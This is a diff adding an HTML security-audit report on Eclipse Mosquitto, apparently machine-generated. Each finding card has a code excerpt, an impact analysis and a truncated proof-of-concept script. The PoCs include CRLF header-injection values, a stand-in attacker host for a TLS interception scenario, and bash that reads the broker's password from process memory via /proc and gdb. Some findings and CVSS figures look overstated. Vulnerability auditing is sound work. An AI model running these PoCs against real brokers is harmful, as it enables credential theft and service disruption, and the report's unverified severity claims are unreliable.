+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;mosquitto.h&gt;
+
+/* 用于触发UAF的恶意回调函数 */
+int malicious_callback(struct mosquitto *mosq, void *obj, const struct mosquitto_message *message)
+{
+    /* obj 指向已释放的栈内存 (cb_userdata) */
+    /*</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-6323DDC5 - Buffer Overflow / Out-of-bounds Write</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> lib/helpers.c:68</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>rc = mosquitto_message_copy(&amp;userdata-&gt;messages[userdata-&gt;message_count], message);
+userdata-&gt;message_count++;</code></pre>
+                <p><strong>数据流:</strong> userdata-&gt;message_count is incremented without checking if it exceeds the allocated array size (msg_count). The array is allocated with msg_count elements, but the loop can write beyond the array if more messages arrive than expected.</p>
+                <p><strong>判断理由:</strong> In on_message_simple(), the code checks userdata-&gt;max_msg_count before decrementing it, but it does not check userdata-&gt;message_count against the allocated size before writing to userdata-&gt;messages[userdata-&gt;message_count]. If multiple messages arrive concurrently or if the logic allows message_count to exceed max_msg_count, this can write past the end of the allocated buffer. The array is allocated with msg_count elements, but message_count is only bounded by max_msg_count which starts at msg_count. However, there is a race condition: max_msg_count is decremented before message_count is incremented, and if two messages arrive simultaneously, both could pass the max_msg_count check before either decrements it, leading to a buffer overflow.</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞可导致：1) 堆缓冲区溢出，覆盖相邻内存区域；2) 程序崩溃（拒绝服务）；3) 在特定条件下可能实现远程代码执行，因为溢出发生在堆上，可能覆盖函数指针或其他关键数据结构；4) 信息泄露，因为溢出可能读取相邻内存内容。CVSS评分约7.5（高严重性）。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC for VULN-6323DDC5 - Mosquitto subscribe_simple buffer overflow
+ * 仅供研究使用
+ * 
+ * 编译: gcc -o poc_vuln_6323ddc5 poc_vuln_6323ddc5.c -lmosquitto -lpthread
+ * 运行: ./poc_vuln_6323ddc5 &lt;broker_host&gt; &lt;broker_port&gt;
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;mosquitto.h&gt;
+
+/* 目标: 触发 on_message_simple 中的缓冲区溢出 */
+
+#define MSG_COUNT 5       /* 分配5个元素的数组 */
+#define ATTACK_MSGS 10   </code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-82828572 - HTTP请求走私/注入</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> lib\http_client.c:72</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>path = context-&gt;wsd.http_path?context-&gt;wsd.http_path:&quot;/mqtt&quot;;
+
+packet-&gt;packet_length = (uint32_t )snprintf((char *)&amp;packet-&gt;payload[WS_PACKET_OFFSET], 1024,
+			&quot;GET %s HTTP/1.1\r\n&quot;
+			&quot;Host: %s\r\n&quot;
+			&quot;Upgrade: websocket\r\n&quot;
+			&quot;Connection: Upgrade\r\n&quot;
+			&quot;Sec-WebSocket-Key: %s\r\n&quot;
+			&quot;Sec-WebSocket-Protocol: mqtt\r\n&quot;
+			&quot;Sec-WebSocket-Version: 13\r\n&quot;
+			&quot;\r\n&quot;, path, context-&gt;host, key);</code></pre>
+                <p><strong>数据流:</strong> context-&gt;wsd.http_path 用户可控路径 -&gt; snprintf直接拼接进HTTP请求行 -&gt; 发送到服务器</p>
+                <p><strong>判断理由:</strong> context-&gt;wsd.http_path 是用户可控的输入，直接拼接到HTTP GET请求的路径中。攻击者可以通过注入回车换行符(\r\n)来注入额外的HTTP头部或请求体，导致HTTP请求走私攻击。例如，如果http_path包含&#x27;\r\nHost: evil.com\r\n&#x27;，可以篡改Host头或注入其他恶意头部。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者通过注入\r\n序列到HTTP请求路径中，实现以下攻击效果：1) Host头篡改 - 可重定向请求到恶意服务器；2) HTTP请求走私 - 可绕过安全控制访问受限资源；3) 头部注入 - 可注入恶意Cookie、认证信息或X-Forwarded-For等头部；4) 缓存投毒 - 在代理环境下可污染缓存；5) 会话劫持 - 通过注入恶意Cookie窃取用户会话。严重性为高，CVSS评分约7.5-8.5。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+HTTP请求走私/注入漏洞PoC - 仅供安全研究使用
+漏洞ID: VULN-82828572
+目标: Mosquitto MQTT Broker (WebSocket实现)
+&quot;&quot;&quot;
+
+import socket
+import base64
+import os
+
+# 仅供安全研究使用
+
+def generate_websocket_key():
+    &quot;&quot;&quot;生成合法的WebSocket密钥&quot;&quot;&quot;
+    return base64.b64encode(os.urandom(16)).decode()
+
+def exploit_http_smuggling(target_host, target_port, malicious_path):
+    &quot;&quot;&quot;
+    利用HTTP请求走私漏洞
+    
+    攻击原理：
+    通过注入\r\n序列，在HTTP请求行中插入额外的头部或请</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-C2834320 - HTTP响应头注入</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> lib\http_client.c:72</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>packet-&gt;packet_length = (uint32_t )snprintf((char *)&amp;packet-&gt;payload[WS_PACKET_OFFSET], 1024,
+			&quot;GET %s HTTP/1.1\r\n&quot;
+			&quot;Host: %s\r\n&quot;
+			...
+			&quot;\r\n&quot;, path, context-&gt;host, key);</code></pre>
+                <p><strong>数据流:</strong> context-&gt;host 用户可控主机名 -&gt; snprintf直接拼接进Host头 -&gt; 发送到服务器</p>
+                <p><strong>判断理由:</strong> context-&gt;host 是用户可控的输入，直接拼接到HTTP Host头中。攻击者可以通过注入回车换行符来注入额外的HTTP头部，例如设置host为&#x27;example.com\r\nX-Injected: true&#x27;，从而操纵HTTP请求结构。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者通过注入CRLF序列在HTTP请求中插入任意头部，可能导致：1) HTTP请求走私攻击，绕过安全控制；2) Web缓存投毒，影响其他用户；3) 会话劫持，通过注入Cookie或认证头；4) 绕过基于Host头的访问控制；5) 在特定场景下可能导致SSRF攻击。由于该漏洞位于生产代码中，且影响WebSocket握手过程，可能影响所有使用该库的MQTT over WebSocket连接。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+HTTP响应头注入漏洞PoC - 仅供研究使用
+漏洞ID: VULN-C2834320
+影响组件: Eclipse Mosquitto WebSocket客户端
+&quot;&quot;&quot;
+
+import socket
+import ssl
+import sys
+
+# 漏洞利用配置
+TARGET_HOST = &quot;example.com&quot;  # 目标MQTT服务器
+TARGET_PORT = 443  # WebSocket端口
+
+# 恶意Host值 - 注入额外的HTTP头
+# 通过CRLF注入，在Host头后添加自定义头部
+MALICIOUS_HOST = &quot;example.com\r\nX-Injected-Header: injected_value\r\nX-Custom-Header: 1&quot;
+
+# 正常的WebSocket升级请求路径
+WS_PATH = &quot;/mqtt&quot;
+
+def build_exploit_request(</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-C3489EDA - 整数溢出/内存分配过大</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> lib/net_ws.c:198</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>mosq-&gt;wsd.out_packet = mosquitto_calloc(1, sizeof(struct mosquitto__packet) + WS_PACKET_OFFSET + mosq-&gt;wsd.payloadlen + 1);</code></pre>
+                <p><strong>数据流:</strong> 网络输入 -&gt; payloadlen -&gt; calloc大小计算</p>
+                <p><strong>判断理由:</strong> 在net__read_ws函数中，使用攻击者控制的payloadlen值计算内存分配大小。虽然前面有检查payloadlen &gt; MQTT_MAX_PAYLOAD，但如果MQTT_MAX_PAYLOAD定义过大或payloadlen_bytes为8时，payloadlen可能被构造为接近UINT64_MAX的值，导致sizeof(struct mosquitto__packet) + WS_PACKET_OFFSET + mosq-&gt;wsd.payloadlen + 1发生整数溢出，分配远小于预期大小的内存，后续写入导致堆缓冲区溢出。</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞可导致：1) 堆缓冲区溢出，可能覆盖相邻内存区域；2) 远程代码执行（RCE），攻击者可控制程序执行流；3) 拒绝服务（DoS），服务器进程崩溃；4) 信息泄露，攻击者可能读取敏感内存数据。由于Mosquitto通常以root或高权限运行，成功利用可能导致完全控制服务器。CVSS评分估计为8.8（高严重性）。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC for VULN-C3489EDA - Mosquitto WebSocket Integer Overflow
+仅供研究使用 (For Research Purposes Only)
+&quot;&quot;&quot;
+
+import socket
+import struct
+import sys
+
+def create_websocket_frame(payload_len):
+    &quot;&quot;&quot;
+    构造一个WebSocket帧，payloadlen字段设置为接近UINT64_MAX的值
+    触发整数溢出：sizeof(struct mosquitto__packet) + WS_PACKET_OFFSET + payloadlen + 1
+    &quot;&quot;&quot;
+    # WebSocket帧头格式:
+    # 1字节: FIN(1) + RSV(000) + Opcode(0010=binary)
+    fin_opcod</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-29773CEE - 不安全的TLS配置 - 允许跳过主机名验证</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> lib/tls_mosq.c:52</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>if(mosq-&gt;tls_insecure == true
+			|| (mosq-&gt;tls_cafile == NULL &amp;&amp; mosq-&gt;tls_capath == NULL &amp;&amp; mosq-&gt;tls_use_os_certs == false)){
+
+		return MOSQ_ERR_SUCCESS;
+	}</code></pre>
+                <p><strong>数据流:</strong> 当tls_insecure为true时，或未配置任何CA证书时，函数直接返回成功，跳过主机名验证。</p>
+                <p><strong>判断理由:</strong> 当tls_insecure设置为true时，完全跳过主机名验证，这允许中间人攻击。攻击者可以使用任何有效的证书（即使域名不匹配）来冒充服务器。此外，当未配置任何CA证书时也跳过验证，这可能导致在没有证书验证的情况下建立TLS连接，完全破坏了TLS的安全性。</p>
+                <p><strong>影响分析:</strong> 严重程度：高。攻击者可以完全绕过TLS主机名验证，实现中间人攻击。具体影响包括：1) 窃取MQTT通信中的敏感数据（如传感器数据、控制命令、认证凭据）；2) 篡改发布的消息内容，注入恶意数据或命令；3) 冒充合法客户端发布虚假数据，破坏系统完整性；4) 在IoT场景中，可能导致设备被远程控制；5) 完全破坏TLS连接的安全性和信任模型。此漏洞影响所有使用Mosquitto库且配置了不安全TLS选项的应用程序，包括MQTT代理和客户端。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC: 利用Mosquitto TLS主机名验证绕过漏洞
+漏洞ID: VULN-29773CEE
+仅供安全研究使用
+&quot;&quot;&quot;
+
+import ssl
+import socket
+import paho.mqtt.client as mqtt
+import sys
+
+# 攻击者控制的恶意MQTT服务器配置
+ATTACKER_HOST = &quot;attacker-malicious.com&quot;  # 攻击者服务器域名
+ATTACKER_PORT = 8883  # MQTT over TLS端口
+
+# 攻击者使用自签名证书（域名与目标服务器不匹配）
+# 但客户端配置了tls_insecure=True，因此主机名验证被跳过
+
+def create_vulnerable_client():
+    &quot;&quot;&quot;
+    创建一个存在漏洞的MQTT客户端
+    前置条件：
+    1. 客户端设置 tls_insecure=True
+    </code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-A7360C60 - 未初始化变量使用</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> libcommon/cjson_common.c:103</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>mosquitto_property_read_string_pair(properties, propid, &amp;name, &amp;value, false);
+if(cJSON_AddStringToObject(obj, &quot;name&quot;, name) == NULL
+        || cJSON_AddStringToObject(obj, &quot;value&quot;, value) == NULL){</code></pre>
+                <p><strong>数据流:</strong> mosquitto_property_read_string_pair() -&gt; name/value -&gt; cJSON_AddStringToObject()</p>
+                <p><strong>判断理由:</strong> 在MQTT_PROP_USER_PROPERTY分支中，调用mosquitto_property_read_string_pair后，没有检查返回值是否为NULL。如果该函数返回NULL（例如属性不存在或读取失败），name和value指针可能未被初始化或指向无效内存。后续直接使用name和value调用cJSON_AddStringToObject会导致使用未初始化指针，可能造成程序崩溃或信息泄露。</p>
+                <p><strong>影响分析:</strong> 该漏洞可导致以下影响：1) 程序崩溃：使用未初始化指针作为cJSON_AddStringToObject的参数，可能导致段错误；2) 内存损坏：对未初始化指针执行free操作，可能导致双重释放、释放野指针或堆内存损坏；3) 信息泄露：如果未初始化指针恰好指向内存中的敏感数据，可能通过JSON输出泄露这些信息；4) 拒绝服务：攻击者可以通过发送特制MQTT消息导致服务崩溃，造成拒绝服务。由于该代码位于生产代码中，影响范围包括所有使用该函数的Mosquitto组件。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC代码 - 仅供研究使用
+ * 漏洞: 未初始化变量使用 (VULN-A7360C60)
+ * 文件: libcommon/cjson_common.c
+ * 函数: mosquitto_properties_to_json()
+ * 
+ * 触发条件: 当MQTT消息包含USER_PROPERTY属性但mosquitto_property_read_string_pair()
+ * 返回NULL时，name和value指针保持未初始化状态，导致后续使用未初始化指针
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;mosquitto.h&gt;
+
+/* 模拟mosquitto_property结构体 */
+typedef struct mosquitto_property {
+    int identifier;
+    void *value;
+    struct mosquitto_property *next;
+} mo</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-AF9AB559 - 不安全的密码哈希迭代次数</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> libcommon/password_common.c:50</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>#define PW_DEFAULT_ITERATIONS 1000</code></pre>
+                <p><strong>数据流:</strong> PW_DEFAULT_ITERATIONS 在 pw__create_sha512_pbkdf2 函数中被用作默认迭代次数</p>
+                <p><strong>判断理由:</strong> PBKDF2的默认迭代次数仅为1000次，远低于当前安全标准（建议至少100000次）。这会导致密码哈希容易被暴力破解或字典攻击。</p>
+                <p><strong>影响分析:</strong> 该漏洞导致密码哈希的安全性严重不足。PBKDF2迭代次数仅为1000次，远低于当前安全标准（OWASP建议至少100000次，NIST建议至少10000次）。攻击者可以：1) 以极低成本进行离线暴力破解，速度比安全配置快100倍以上；2) 使用GPU并行计算，每秒可尝试数百万个密码；3) 配合彩虹表或字典攻击，弱密码可在数秒内被破解。这可能导致用户账户被批量攻破，系统遭受未授权访问。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC: 不安全的密码哈希迭代次数 (PBKDF2迭代次数过低)
+漏洞ID: VULN-AF9AB559
+仅供研究使用 - 请勿用于非法用途
+&quot;&quot;&quot;
+
+import hashlib
+import base64
+import os
+import time
+from typing import Tuple
+
+# 模拟漏洞环境中的弱迭代次数
+WEAK_ITERATIONS = 1000  # 漏洞代码中的PW_DEFAULT_ITERATIONS
+STRONG_ITERATIONS = 100000  # 当前安全标准建议值
+
+def generate_password_hash(password: str, salt: bytes, iterations: int) -&gt; bytes:
+    &quot;&quot;&quot;模拟PBKDF2-SHA512密码哈希生成&quot;&quot;&quot;
+    return hashlib.pbkdf2_hmac(
+</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-1626FB30 - 硬编码凭证/环境变量密码泄露</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> plugins\examples\auth-by-env\mosquitto_auth_by_env.c:28</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>#define ENV_MOSQUITTO_PASSWORD &quot;MOSQUITTO_PASSWORD&quot;</code></pre>
+                <p><strong>数据流:</strong> 环境变量MOSQUITTO_PASSWORD -&gt; getenv() -&gt; mosquitto_strdup() -&gt; environment_password全局变量 -&gt; basic_auth_callback()中与用户密码比较</p>
+                <p><strong>判断理由:</strong> 该插件使用单一环境变量作为所有用户的共享密码，存在严重安全隐患：1) 所有用户使用相同密码，无法区分用户身份；2) 环境变量在进程内存中可被其他进程读取；3) 密码以明文形式存储在全局变量environment_password中，可能被内存转储泄露；4) 缺乏密码轮换机制和审计日志</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者通过获取单一共享密码，以任意用户身份访问 MQTT Broker。由于所有用户使用相同密码，一旦密码泄露，攻击者可以：1) 冒充任何用户发布/订阅消息；2) 访问所有主题（如果 ACL 未正确配置）；3) 进行中间人攻击或数据篡改。密码以明文形式存储在进程内存中，增加了通过内存转储或 /proc 文件系统泄露的风险。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/bin/bash
+# 仅供研究使用 - 硬编码凭证/环境变量密码泄露 PoC
+# 漏洞: Mosquitto auth-by-env 插件使用单一环境变量作为共享密码
+
+# PoC 1: 环境变量泄露 - 通过 /proc 文件系统读取其他进程的环境变量
+# 前置条件: 攻击者具有本地用户权限，可以访问 /proc 文件系统
+
+echo &quot;=== PoC 1: 通过 /proc 文件系统泄露环境变量 ===&quot;
+echo &quot;[!] 仅供研究使用&quot;
+echo &quot;&quot;
+
+# 查找运行 Mosquitto 的进程
+MOSQUITTO_PID=$(pgrep -x mosquitto 2&gt;/dev/null || pgrep -f &quot;mosquitto -c&quot; 2&gt;/dev/null)
+
+if [ -z &quot;$MOSQUITTO_PID&quot; ]; then
+    echo &quot;[-] 未找到 Mosquitto 进程&quot;
+    echo &quot;[*] 尝试查找</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-F6717ACB - 密码以明文形式存储在内存中</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> plugins\examples\auth-by-env\mosquitto_auth_by_env.c:31</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>static char *environment_password = NULL;</code></pre>
+                <p><strong>数据流:</strong> 环境变量 -&gt; getenv() -&gt; mosquitto_strdup() -&gt; environment_password全局指针</p>
+                <p><strong>判断理由:</strong> 密码以明文形式存储在全局变量中，进程生命周期内一直驻留在内存。攻击者通过/proc/pid/mem或核心转储可获取密码。应使用后立即清零敏感内存区域，或使用安全内存分配函数</p>
+                <p><strong>影响分析:</strong> 攻击者可以获取MQTT服务器的明文密码，从而：1) 完全控制MQTT消息代理，2) 读取、修改或发布所有MQTT主题的消息，3) 利用MQTT连接作为跳板攻击其他系统，4) 密码可能被用于其他系统（密码重用风险）。由于密码在进程生命周期内始终驻留内存，即使攻击者只在短时间内获得访问权限，也能提取密码。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/bin/bash
+# 仅供研究使用 - 密码明文存储漏洞PoC
+# 针对Mosquitto auth-by-env插件
+
+# PoC 1: 通过/proc/pid/mem读取密码
+# 前置条件：攻击者拥有与mosquitto进程相同的用户权限或root权限
+
+echo &quot;[+] 查找mosquitto进程PID&quot;
+MOSQUITTO_PID=$(pgrep -f mosquitto | head -1)
+if [ -z &quot;$MOSQUITTO_PID&quot; ]; then
+    echo &quot;[-] 未找到mosquitto进程&quot;
+    exit 1
+fi
+echo &quot;[+] Mosquitto PID: $MOSQUITTO_PID&quot;
+
+# 方法1: 使用gdb读取全局变量
+echo &quot;[+] 方法1: 使用gdb读取environment_password&quot;
+sudo gdb -batch -ex &quot;attach $MOSQUITTO_PID&quot; -ex &qu</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-4DE17CF4 - 空指针解引用</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> plugins\examples\auth-by-ip\mosquitto_auth_by_ip.c:56</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>ip_address = mosquitto_client_address(ed-&gt;client);
+if(!strcmp(ip_address, &quot;127.0.0.1&quot;)){</code></pre>
+                <p><strong>数据流:</strong> mosquitto_client_address()返回值直接传递给strcmp()</p>
+                <p><strong>判断理由:</strong> 代码未检查mosquitto_client_address()的返回值是否为NULL。如果该函数返回NULL（例如在异常情况下），strcmp()将尝试解引用空指针，导致程序崩溃。这可能导致拒绝服务攻击。</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞可导致Mosquitto服务器进程因空指针解引用而崩溃，造成拒绝服务(DoS)。由于该插件用于基于IP的访问控制，崩溃后所有客户端连接将被拒绝，直到服务器重启。在Mosquitto 2.0+中，插件崩溃可能导致整个broker进程终止，影响所有连接的客户端。虽然该插件位于examples目录，但官方文档表明它可作为生产环境插件使用，因此影响范围包括所有使用此插件的Mosquitto部署。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC for VULN-4DE17CF4 - Mosquitto auth-by-ip plugin NULL pointer dereference
+仅供研究使用 (For research purposes only)
+&quot;&quot;&quot;
+
+import socket
+import time
+import sys
+
+# 目标MQTT服务器配置
+TARGET_HOST = &quot;127.0.0.1&quot;  # 目标Mosquitto服务器地址
+TARGET_PORT = 1883          # MQTT默认端口
+
+def create_malformed_connect_packet():
+    &quot;&quot;&quot;
+    构造一个畸形的MQTT CONNECT包，触发异常连接状态
+    导致mosquitto_client_address()返回NULL
+    &quot;&quot;&quot;
+    # MQTT CONNECT包</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-540C5A41 - 资源未清理</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> plugins/examples/client-lifetime-stats/mosquitto_client_lifetime_stats.c:175</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>int mosquitto_plugin_cleanup(void *user_data, struct mosquitto_opt *opts, int opt_count)
+{
+    UNUSED(user_data);
+    UNUSED(opts);
+    UNUSED(opt_count);
+
+    return MOSQ_ERR_SUCCESS;
+}</code></pre>
+                <p><strong>数据流:</strong> 插件清理函数没有释放local_lifetimes哈希表中的所有条目。</p>
+                <p><strong>判断理由:</strong> 当插件卸载时，mosquitto_plugin_cleanup函数被调用，但它没有遍历并释放local_lifetimes哈希表中的所有client结构体。这会导致在插件卸载时，所有仍在哈希表中的客户端连接信息都泄漏了。</p>
+                <p><strong>影响分析:</strong> 该漏洞导致在插件卸载时，所有仍在连接的客户端信息（client结构体）都未被释放，造成内存泄漏。每个泄漏的条目包含一个lifetime_s结构体（包含UT_hash_handle、指针和time_t）和一个字符串ID。在长时间运行或频繁加载/卸载插件的场景下，累积的内存泄漏可能导致服务器内存耗尽，影响系统稳定性。虽然该插件位于examples目录，但作为官方示例，可能被用户直接使用或参考，因此存在实际风险。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC代码 - 仅供研究使用
+ * 漏洞: Mosquitto插件资源泄漏 (VULN-540C5A41)
+ * 文件: plugins/examples/client-lifetime-stats/mosquitto_client_lifetime_stats.c
+ * 
+ * 此PoC演示了在插件卸载时local_lifetimes哈希表未清理导致的资源泄漏
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;time.h&gt;
+#include &lt;uthash.h&gt;
+#include &quot;mosquitto.h&quot;
+
+/* 模拟原始插件的结构体和哈希表 */
+struct lifetime_s {
+    UT_hash_handle hh;
+    char *id;
+    time_t connect;
+};
+
+/* 模拟全局哈希表 - 与原始插件相同 */
+struct lifetime_s *</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-ED26637A - 竞态条件</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> plugins/examples/delayed-auth/mosquitto_delayed_auth.c:55</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>HASH_FIND(hh, clients, id, strlen(id), client);
+if(client){
+    client-&gt;request_time = time(NULL);
+}else{
+    client = mosquitto_malloc(sizeof(struct client_list));
+    ...
+    HASH_ADD_KEYPTR(hh, clients, client-&gt;id, strlen(client-&gt;id), client);
+}</code></pre>
+                <p><strong>数据流:</strong> 查找客户端 -&gt; 更新或创建客户端 -&gt; 添加到哈希表</p>
+                <p><strong>判断理由:</strong> 在多线程环境下，对全局哈希表clients的访问没有加锁保护。如果多个线程同时处理同一个客户端的认证请求，可能导致数据竞争，如重复添加客户端或内存泄漏。</p>
+                <p><strong>影响分析:</strong> 该竞态条件漏洞可能导致以下影响：
+1. 内存泄漏：重复添加客户端导致旧客户端对象无法被释放
+2. 数据不一致：多个线程同时更新client-&gt;request_time导致认证逻辑混乱
+3. 认证绕过：在极端情况下，可能导致认证状态不一致，使未授权客户端通过认证
+4. 拒绝服务：大量重复添加客户端可能耗尽服务器内存
+5. 信息泄露：通过观察认证延迟时间，攻击者可能推断出其他客户端的存在</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC代码 - 仅供研究使用
+ * 漏洞: Mosquitto delayed-auth插件竞态条件
+ * 文件: plugins/examples/delayed-auth/mosquitto_delayed_auth.c
+ * 行号: 55
+ * 
+ * 此PoC通过模拟多线程并发认证请求来触发竞态条件
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;time.h&gt;
+
+/* 模拟客户端结构体 */
+struct client_list {
+    char *id;
+    time_t request_time;
+    int ref_count;  /* 用于检测重复添加 */
+};
+
+/* 模拟全局哈希表（简化版） */
+#define MAX_CLIENTS 1000
+static struct client_</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-5B3C7A3B - 整数溢出</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> plugins\examples\payload-modification\mosquitto_payload_modification.c:63</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>new_payloadlen = ed-&gt;payloadlen + (uint32_t)strlen(&quot;hello &quot;)+1;</code></pre>
+                <p><strong>数据流:</strong> ed-&gt;payloadlen 来自外部消息输入，与 strlen(&quot;hello &quot;)+1 相加，结果赋值给 uint32_t 类型的 new_payloadlen。如果 ed-&gt;payloadlen 接近 UINT32_MAX，加法可能导致整数溢出，new_payloadlen 变为一个很小的值。</p>
+                <p><strong>判断理由:</strong> ed-&gt;payloadlen 是 uint32_t 类型，来自用户可控的消息输入。当 ed-&gt;payloadlen 接近 UINT32_MAX 时，加上 strlen(&quot;hello &quot;)+1（7）会导致整数溢出，new_payloadlen 变为一个很小的值。后续 mosquitto_calloc(1, new_payloadlen) 会分配一个很小的缓冲区，但 memcpy 会复制 ed-&gt;payloadlen 长度的数据（接近 UINT32_MAX），导致堆缓冲区溢出，可能造成内存损坏或代码执行。</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞可导致：1) Mosquitto Broker进程崩溃，造成拒绝服务；2) 堆内存损坏，可能被利用实现远程代码执行；3) 由于Broker通常以高权限运行，可能导致整个系统被控制；4) 所有连接到该Broker的MQTT客户端通信可能被中断或窃听。CVSS评分估计为8.8（高），攻击复杂度低，无需认证。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC for VULN-5B3C7A3B - Mosquitto Payload Modification Plugin Integer Overflow
+仅供研究使用 (For Research Purposes Only)
+
+该PoC演示了如何通过发送特制MQTT消息触发整数溢出漏洞，
+导致堆缓冲区溢出。
+&quot;&quot;&quot;
+
+import socket
+import struct
+import sys
+
+# MQTT协议常量
+CONNECT = 0x10
+PUBLISH = 0x30
+QOS_0 = 0x00
+
+# 目标配置
+HOST = &quot;127.0.0.1&quot;
+PORT = 1883
+
+def create_connect_packet():
+    &quot;&quot;&quot;创建MQTT CONNECT报文&quot;&quot;&quot;
+    # 可变头部
+    protocol_name = b&quot;MQTT&quot;
+  </code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #dc3545;">
+                <h3>VULN-5126587F - 缓冲区溢出/越界写入</h3>
+                <span class="severity" style="background:#dc3545;color:white;padding:2px 8px;border-radius:3px;">CRITICAL</span>
+                <p><strong>文件:</strong> plugins\examples\topic-modification\mosquitto_topic_modification.c:62</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>ed-&gt;topic[strlen(ed-&gt;topic) - strlen(&quot;/uplink&quot;)] = &#x27;\0&#x27;;</code></pre>
